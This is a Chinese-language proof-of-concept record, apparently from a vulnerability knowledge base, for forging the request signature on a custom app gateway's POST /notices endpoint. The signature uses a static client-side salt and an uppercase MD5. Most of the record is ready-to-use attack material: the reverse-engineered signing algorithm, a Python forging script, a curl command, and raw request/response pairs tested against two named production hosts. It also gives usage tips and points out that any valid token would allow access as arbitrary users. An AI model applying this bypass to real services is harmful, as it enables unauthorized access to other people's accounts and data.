# 自研 App 网关 POST /notices 签名门可离线伪造（静态盐 private_notices，裸 key+value 升序 + MD5 大写）——仅越过签名层，仍被 token→账号层拦死

- **code**: app-gateway-notices-static-salt-signature-forge
- **kind**: poc
- **category**: auth-bypass
- **component**: 自研 App 后端网关（POST /notices，与 /maintenance 同族 private_* 签名机制）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#614（2026-11-04 15:34–15:39 UTC）。在两台生产 accessurl 上做「仅变量=verify」的 A/B 对照：cbob.evuzp9.com:46750（经平台代理 GW-26，auto_off）POST /notices，verify 全零 → HTTP 200 / 39B / {"ret":1,"msg":"参数检查失败！"}（2.02s）；同一 body 仅把 verify 换成离线复算的 71F92ABA6D7A935CCAADBB9AFE42E45E → 200 / 39B / {"ret":2,"msg":"账号认证失败！"}（2.39s）。第二台 110.41.227.204:46750 直连（--noproxy '*'）复测结果一致：全零 → ret=1（0.50s），复算值 → ret=2（0.38s，Server: Microsoft-IIS）。响应状态从「参数检查失败」变为「账号认证失败」证明服务端确实校验了签名并接受了伪造值，签名层被完全绕过；但下一层 token→账号绑定拒绝了客户端默认字面量 token=123，本轮未取得任何 data 字段。另证伪：POST /v2/notices（同 body）0 字节 / 20.02s / curl exit 28，GET 与 OPTIONS / 均为 403（134B 自定义 HTML），说明业务路由在根路径、/v2 前缀不存在。
- **path**: pocs/app-gateway-notices-static-salt-signature-forge/poc.http
- **tags**: auth-bypass, 签名伪造, 静态盐, md5, verify, notices, 网关, app后端, 客户端硬编码, 越权前置, 无凭据复算, iis
- **created_at**: 2026-11-04T15:45:49.004Z
- **engine**: cbob.evuzp9.com:46750, 110.41.227.204:46750
- **found_by**: vuln-scan

## 描述

该网关在业务路由 POST /notices 上用 verify 参数做「参数防篡改」，但签名材料全部为客户端静态量：请求字段 version/token/type/userid 按 key 字典序裸拼（无 =、无 &、无分隔符）后直接接静态盐 "private_notices"，MD5 取 32 位大写。盐值来自客户端程序集字面量，任何第三方无需凭据即可离线复算并伪造 verify。因此认证链的第一层（签名）不构成访问控制；真正的门是下一层 token→账号绑定。一旦获得任意有效 token，即可用任意 userid 调用该批业务接口（水平越权面直接打开）。本条为 523（/maintenance，盐 private_maintenance）的同机制不同路由扩展。

## 用法

```
前置：无需账号/凭据/Cookie；Content-Type: application/json;charset=utf-8；HTTPS 若为自签需 -k；IP 字面量主机需 --noproxy '*' 直连（走平台代理会 TLS 建链失败 rc=35）；固定出口 IP、单发不重放、间隔≥5s。

① 复算 verify（注意：字段集合与 /maintenance 不同，gameid 不参与签名）
  signstr = "".join(f"{k}{v}" for k in sorted(参与签名的字段)) + "private_notices"
  参与签名 = version, token, type, userid
  类型：version/token 为 string，type 为 int，userid 为 long（拼接时按数值形态，不带引号）
  本次样本 signstr = token123 + type1 + userid10000 + version1.0.0.9 + private_notices
  verify = MD5(signstr).upper() = 71F92ABA6D7A935CCAADBB9AFE42E45E

python 复算：
  import hashlib
  def make_verify(p, salt="private_notices"):
      s = "".join(f"{k}{p[k]}" for k in sorted(p)) + salt
      return hashlib.md5(s.encode()).hexdigest().upper()
  body = {"version":"1.0.0.9","token":"123","type":1,"userid":10000}
  body["verify"] = make_verify(body)   # 71F92ABA6D7A935CCAADBB9AFE42E45E

② 请求
  curl.exe -k -s -i --noproxy "*" \
    -H "Content-Type: application/json;charset=utf-8" \
    --data-binary '{"version":"1.0.0.9","token":"123","type":1,"userid":10000,"gameid":"","verify":"71F92ABA6D7A935CCAADBB9AFE42E45E"}' \
    https://<HOST>:46750/notices

③ 三态判据（必须做 A/B，只改 verify 一个变量）
  verify 全零 / 乱填      → HTTP 200 / 39B / {"ret":1,"msg":"参数检查失败！"}   = 签名校验未过（基线）
  verify 离线复算正确     → HTTP 200 / 39B / {"ret":2,"msg":"账号认证失败！"}   = 签名已过，卡在 token→账号层
  {"ret":0,...} + data    → 签名与账号双双通过，可直接取业务数据（本轮未达到）
  判成立的唯一依据是 ret 从 1 变 2；若任意 32 位随机 hex 也返回 ret=2，则与签名无关，结论不成立。

④ 路由形态（易踩的坑）
  业务路由在根路径 /notices，不存在 /v2/notices（后者 0 字节 20s 超时，是路径不存在被静默丢弃，不是被 WAF 拦）。
  GET / 与 OPTIONS / → 403 / 134B 自定义 HTML，根路径无业务面，只有白名单路由被转发到 JSON 处理器。

常见失败原因：
- 用了 /maintenance 的 7 字段集合或盐 private_maintenance → 必得 ret=1；
- 把 gameid 拼进签名串 → 必错（它不参与）；
- userid/type 用字符串引号参与拼接 → 数值类型必须按数字形态拼；
- verify 用小写 MD5；
- 走代理打 IP 字面量主机导致 TLS rc=35 无响应（不是签名问题）。
```

## 正文

```
## 目标与前置

- 入口：`POST https://<HOST>:46750/notices`（JSON；等价入口另一台生产 accessurl）
- 无需任何账号 / 凭据 / Cookie / 会话（本轮零 Cookie、未登录）
- `Content-Type: application/json;charset=utf-8`
- 固定出口 IP（代理 auto_off），单发不重放、请求间隔 ≥5s
- IP 字面量主机需 `--noproxy '*'` 直连：走平台代理对该主机会 TLS 建链失败 rc=35

## 签名算法（客户端反汇编所得，非猜测）

来源：客户端 `GetNotices` 方法（RVA 0x315CD50）
依次 `Concat('version'+v, 'token'+t, 'type'+Int32, 'userid'+Int64)` → `List.Sort`
→ 拼盐字面量 `private_notices` → `GameUtils.GenerateMD5` → `String.ToUpper`。

```
参与签名字段 = version(string), token(string), type(int), userid(long)
                  # gameid 为不参与签名的 string 字段
signstr = join( k + value[k] for k in sorted(keys) ) + "private_notices"
verify  = MD5(signstr).upper()      # 32 位大写十六进制
```

裸 key 拼裸 value：既无 `=`、无 `&`，字段之间也无分隔符。

本次样本：

```
signstr = token123 + type1 + userid10000 + version1.0.0.9 + private_notices
verify  = 71F92ABA6D7A935CCAADBB9AFE42E45E
```

## A/B 对照（唯一变量 = verify）

### ① 错误签名（基线）

```http
POST /notices HTTP/1.1
Host: <HOST>:46750
Content-Type: application/json;charset=utf-8

{"version":"1.0.0.9","token":"123","type":1,"userid":10000,"gameid":"","verify":"00000000000000000000000000000000"}
```

```
HTTP/1.1 200 OK
Content-Length: 39

{"ret":1,"msg":"参数检查失败！"}
```

### ② 离线复算签名（命中签名层）

同一 body，仅把 `verify` 换成 `71F92ABA6D7A935CCAADBB9AFE42E45E`：

```
HTTP/1.1 200 OK
Content-Length: 39

{"ret":2,"msg":"账号认证失败！"}
```

状态从「参数检查失败」→「账号认证失败」，说明服务端确实校验了签名、并接受了伪造值，
请求已越过签名门进入账号/token 校验。卡住的是下一层：客户端默认字面量 `token=123` 被判无效。

### ③ 第二台主机复测（排除单机偶发）

对另一台生产 accessurl 直连（`--noproxy '*'`）：
全零 verify → 200 / 39B / `ret=1`；复算 verify → 200 / 39B / `ret=2`。
响应头：`Server: Microsoft-IIS`、`Content-Type: application/json;charset=utf-8`、
`Access-Control-Allow-Origin: *`、`X-Frame-Options: sameorigin`。

## 路由形态（证伪记录）

| 请求 | 结果 | 解读 |
|---|---|---|
| `POST /notices` | 200 / JSON | 业务路由在根路径 |
| `POST /v2/notices`（同 body） | 0 字节 / 20.02s / curl exit 28 | 路径不存在，静默丢弃；不是 WAF |
| `GET /` | 403 / 134B 自定义 HTML | 根路径无业务面 |
| `OPTIONS /` | 403 / 134B | 同上 |

只有 `/notices`、`/userinfo` 这类白名单路由被转发到 JSON 处理器。

## 为什么只判 low

- 未取得任何 `data` 字段、未取得 token、无写操作；
- 危害上限 = 签名层零防护：签名本身不是访问控制，它只是把攻击面推迟到 token 层；
- 一旦从任何渠道（日志泄露、客户端内存、弱 token、其他接口）拿到任意有效 token，
  即可用任意 `userid` 调用该批业务接口 —— 水平越权面直接打开。

## 证伪条件

- 任意 32 位随机 hex 也返回 `ret=2` → 响应差异与签名无关，结论不成立；
- 正确 verify 与全零 verify 返回同一状态 → 不成立；
- `/notices` 在到达签名校验前强制要求会话 Cookie → 不成立。

## 复算脚本

```python
import hashlib, json

def make_verify(payload: dict, salt="private_notices") -> str:
    # gameid 等非签名字段不要传进来
    signstr = "".join(f"{k}{payload[k]}" for k in sorted(payload)) + salt
    print("signstr =", signstr)
    return hashlib.md5(signstr.encode()).hexdigest().upper()

body = {"version": "1.0.0.9", "token": "123", "type": 1, "userid": 10000}
body["verify"] = make_verify(body)
print(json.dumps(body, ensure_ascii=False))
```

> 同族机制参见知识库条目 `app-gateway-maintenance-static-salt-signature-forge`（/maintenance，盐 `private_maintenance`，7 字段，可拿到 `ret:0`）。
> 本路由的盐为 `private_notices`，字段集合更少，且签名通过后停在 `ret:2`，**不能套用 /maintenance 的 ret:0 判据**。

```
